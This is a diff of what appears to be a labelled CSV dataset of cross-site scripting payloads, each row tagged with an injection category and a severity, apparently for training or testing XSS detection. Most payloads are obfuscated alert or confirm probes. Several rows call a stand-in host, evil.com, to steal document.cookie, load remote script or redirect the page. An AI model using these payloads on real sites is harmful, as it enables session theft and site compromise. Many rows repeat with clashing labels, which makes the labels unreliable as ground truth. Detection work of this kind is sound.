-"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
-"setTimeout(""alert(1)"",0)",dom_sink,medium
-"document.write(""\x3cimg src=x onerror=alert(1)\x3e"")",dom_sink,low
-#{\u0061\u006cert(1)},template_injection,medium
-<script>confirm(1)</script>,script_injection,medium
-javaSCRIPT:confirm(1),script_injection,medium
-"location=""javascript:alert(1)""",dom_sink,medium
-< svg onload=alert()>,html_body,medium
-"<object data=""javascript:al'+'ert(1)"">",dom_sink,medium
-"document.write(""<svg src=x onerror=alert(1)>"")",script_injection,high
-"\""><img src=x onload=alert(1)>",attribute_escape,low
-"\' onerror
-=alert(	1)//",attribute_escape,low
-<BODY ONLOAD=alert(’XSS’)>,html_body,medium
-\x3cvideo src=x onerror=alert(1)\x3e,event_handler,medium
-"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
-javascript:alert(1),js_uri,high
-javascript:alert(1),js_uri,low
-<script>prompt(1)</script>,script_injection,medium
-"""><img src=x onerror=alert(1)>",attribute,low
-\' onerror=alert(1)//,attribute_escape,low
-<img src=x onerror=alert(1)>,tag_injection,high
-\' onerror=alert(1)//,event_handler,high
-"data:text/html,<script>alert(1)</script>",js_uri,medium
-<svg/onload=confirm(1)>,tag_injection,high
-javascript:confirm(1),js_uri,medium
-<textarea>d.innerHTML+='';</script>,html_body,high
-<svg/onload=alert(1)>,script_injection,high
-"&lt;embed src=""javascript:alert(1)""&gt;",attribute,high
-"<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)"">",tag_injection,high
-javascript:alert(document.domain),js_uri,medium
-"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
-javascript:alert(document.domain),js_uri,medium
-\' onerror=al'+'ert(1)//,attribute_escape,high
-\x3csvg/onload=alert(1)\x3e,tag_injection,medium
-<video src=x onerror=alert(1)>,event_handler,low
+"<embed src=""javascript:confirm(1)"">",tag_injection,high
+"<embed src=""javascript:confirm(1)"">",tag_injection,low
+"<embed src=""javascript:confirm(1)"">",tag_injection,high
+"<embed src=""javascript:confirm(1)"">",tag_injection,low
+"<embed src=""javascript:confirm(1)"">",tag_injection,medium
+"<embed src=""javascript:confirm(1)"">",template_injection,high
+"<embed src=""javascript:confirm(1)"">",tag_injection,high
+"<embed src=""javascript:confirm(1)"">",attribute,medium
+"<svG/x="">""/oNloaD=confirm()//",attribute,medium
+"<svG/x="">""/oNloaD=confirm()//",attribute,medium
+onwheel='alert(1)',html_body,medium
+onwheel='alert(1)',attribute,medium
+"<%00script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
+\x3cscript\x3eprompt(1)\x3c/script\x3e,attribute,medium
 \x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
-""" onerror=alert(1) x=""",dom_sink,medium
-<%= alert(1) %>,template_injection,low
-#{confirm(1)},template_injection,low
-""" onload=alert(1) x=""",attribute,low
-"""><img src=x onerror=alert(1)>",attribute,high
-<video src=x onerror=alert(1)>,event_handler,high
-"javascript:void(document.location=""http://evil.com"")",js_uri,medium
-\' onerror=alert(1)//,attribute_escape,high
-<video src=x onerror=alert(1)>,event_handler,low
-"&quot; onerror
-=alert(	1) x
-=&quot;",attribute_escape,high
-\' onerror=alert(1)//,dom_sink,high
+\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,high
+\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
+\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
+%3Cscript%3Ealert(document.domain)%3C/script%3E,attribute,high
+%3Cscript%3Ealert(document.domain)%3C/script%3E,script_injection,high
+&lt;img/src=x onerror=alert(1)//&gt;,event_handler,medium
+&lt;img/src=x onerror=alert(1)//&gt;,js_uri,high
+&lt;img/src=x onerror=alert(1)//&gt;,event_handler,low
+\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,low
+\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,high
+"onload&#61;""alert(1)""",html_body,medium
+<ImG/SrC=X OnErRoR=AlErT(1)//>,event_handler,high
+<ImG/SrC=X OnErRoR=AlErT(1)//>,event_handler,low
+"<sCRIPt>d.inneRHTml+='';</scRiPT>//[""'`-->]]>]</DIV>",html_body,high
+<textarea>d.innerHTML+='';</script>,html_body,high
+<textarea>d.innerHTML+='';</script>,html_body,high
+""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,medium
+""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
+""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
+""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,low
+"<audio>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
+#jAVAScRIPT:ALERT(2);,url,medium
+x=1}}};alert(1)//,attribute,medium
+\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
+\x3cimg/src=x onerror=alert(1)//\x3e,attribute,medium
+\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
+\x3cimg/src=x onerror=alert(1)//\x3e,attribute_escape,low
+%3Cimg/src=%3Dx+onload=alert(2)%3D,attribute,medium
+onload&#61;'alert(1)',html_body,medium
+"setTimeout(""\u0061\u006cert(1)"",0)",attribute,medium
+"setTimeout(""\u0061\u006cert(1)"",0)",template_injection,medium
+javascript:confirm(document.domain),attribute,medium
+javascript:confirm(document.domain),script_injection,medium
+javascript:confirm(document.domain),js_uri,medium
+javascript:confirm(document.domain),js_uri,low
+"document.write(""<img src=x onerror=confirm(1)>"")",event_handler,medium
+"document.write(""<img src=x onerror=confirm(1)>"")",tag_injection,high
+"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,low
+"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,high
+"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,low
+"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,medium
+"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,high
+"<embed src=""javaSCRIPT:alert(1)"">",script_injection,medium
+<SCRIPT>prompt(1)</SCRIPT>,script_injection,medium
+<SCRIPT>prompt(1)</SCRIPT>,script_injection,medium
+<SCRIPT>prompt(1)</SCRIPT>,attribute,low
+%3Cdetails open ontoggle=alert(1)%3E,event_handler,high
+"data:text/html,\x3cscript\x3ealert(1)\x3c/script\x3e",js_uri,high
+"onload=""confirm(1)""",html_body,medium
+confirm(1);,attribute,medium
+"<button>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
+"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",js_uri,high
+"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",attribute,medium
+<svg/onload=al'+'ert(1)>,tag_injection,medium
+<svg/onload=al'+'ert(1)>,tag_injection,low
 <svg/onload=al'+'ert(1)>,tag_injection,high
-"<object data=""javascript:confirm(1)"">",tag_injection,low
-' ><img src=x onerror=alert(1)>,attribute,high
-"<object data=""javascr/**/ipt:alert(1)"">",js_uri,high
-&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
-<script>prompt(1)</script>,js_uri,high
-"document.body.innerHTML=""<img src=x onload=alert(1)>""",script_injection,high
-javascript:alert(1),attribute_escape,low
-<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,tag_injection,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,high
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
-</tag><svg onload=alert(1)>,html_body,medium
-<svg/onload=alert(1)>,tag_injection,medium
-"data:text/html,<script>alert(1)</script>",js_uri,high
-%3Cscript%3Eprompt(1)%3C/script%3E,script_injection,high
-""" onload=alert(1) x=""",attribute,low
-<script>alert(document.domain)</script>,script_injection,high
-javascript:confirm(1),js_uri,low
-&lt;script&gt;confirm(1)&lt;/script&gt;,script_injection,high
-<image src/onerror=alert(1)>,html_body,medium
+<svg/onload=al'+'ert(1)>,attribute_escape,high
+&quot; onload=alert(1) x=&quot;,attribute_escape,high
+&quot; onload=alert(1) x=&quot;,attribute_escape,medium
+&quot; onload=alert(1) x=&quot;,attribute_escape,medium
+<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT>,script_injection,low
+\u003cimg src onerror=confirm`1`\u003e,attribute,medium
+"<vIdeO/><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",attribute,high
+ONLoaD='aLert(1)',html_body,medium
+"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E",js_uri,low
+%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,medium
+%3Cscript%3Econfirm(1)%3C/script%3E,tag_injection,high
 %3Cscript%3Econfirm(1)%3C/script%3E,script_injection,high
-"document.body.innerHTML=""<img src=x onload=alert(1)>""",attribute_escape,high
-<%= aLeRt(1) %>,script_injection,low
-<details open ontoggle=alert(1)>,event_handler,medium
-#javascript:alert(1),url,medium
-""" onload
-=alert(	1) x
-=""",attribute,high
-&quot; onerror=alert(1) x=&quot;,tag_injection,medium
-\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,medium
+\' onerror=\u0061\u006cert(1)//,attribute_escape,low
 \' onerror=\u0061\u006cert(1)//,tag_injection,high
-"\"" onerror=alert(1)//",attribute_escape,medium
+%3cimg onerror=prompt(1) src=a%3e,attribute,medium
+#javascript:alert(document.cookie);,url,medium
+"onerror=""prompt`1`""",html_body,medium
+"""><%00script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
+<ScRiPt>aLeRt(1)</sCrIpT>,script_injection,high
+' onmouseover=al'+'ert(1) ',attribute,high
+%3Cscript%3Eprompt(1)%3C/script%3E,script_injection,high
 ‘)alert(1);//,attribute,medium
-' ><img src=x onerror=alert(1)>,tag_injection,high
-"<iframe src=""javascript:alert(1)"">",js_uri,medium
-javascript:alert(document.domain),js_uri,high
-"setTimeout(""alert(1)"",0)",dom_sink,high
-"""><img src=x onerror=confirm(1)>",attribute,high
-"""><img src=x onerror=confirm(1)>",script_injection,high
-"""><svg src=x onerror=alert(1)>",attribute,low
-"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",attribute,medium
-<details open ontoggle=al'+'ert(1)>,attribute,high
-\' onerror=alert(1)//,attribute_escape,medium
-"eval(""alert(1)"")",dom_sink,high
-"javascript:void(document.location=""http://evil.com"")",event_handler,high
-${alert(1)},template_injection,high
-#{confirm(1)},dom_sink,high
-"<iframe src=""javascript:alert(1)"">",tag_injection,medium
-""" onfocus=alert(1) autofocus=""",attribute,high
+onERROR='AlErt(1)',html_body,medium
+<SvG/OnLoAd=aLeRt(1)>,tag_injection,low
+<SvG/OnLoAd=aLeRt(1)>,tag_injection,medium
+<table/onload=alert(0);>,html_body,medium
+"document.write(""&lt;img src=x onerror=alert(1)&gt;"")",attribute_escape,low
+onloaD='aLeRT(1)',attribute,medium
+onload='confirm`1`',attribute,medium
+"lOcAtIoN=""jAvAsCrIpT:AlErT(1)""",tag_injection,medium
+<Svg onloAD=alErt()>,html_body,medium
